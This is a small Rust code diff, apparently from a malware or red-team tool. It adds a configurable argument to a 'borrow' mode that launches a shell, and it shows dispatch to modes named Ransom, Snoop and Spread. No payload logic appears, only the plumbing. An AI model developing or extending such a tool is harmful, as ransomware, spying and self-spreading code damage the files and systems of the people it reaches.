@@ -98,7 +98,7 @@ fn main() {
     // run the user specified mode
     if let Some(mode) = cli.mode {
         match mode {
-            Modes::Borrow => borrow(get_exe(&conf)),
+            Modes::Borrow => borrow(get_exe(&conf), get_exearg(&conf)),
             Modes::Ransom => ransom(&get_root(&conf), &get_catcher(&conf)),
             Modes::Snoop => snoop(),
             Modes::Spread => spread(),
@@ -162,4 +162,8 @@ fn get_exe(conf: &Option<Config>) -> PathBuf {
     } else {
         PathBuf::from("/bin/sh")
     }
+}
+
+fn get_exearg(conf: &Option<Config>) -> Option<String> {
+    get_field("exearg", conf)
 }
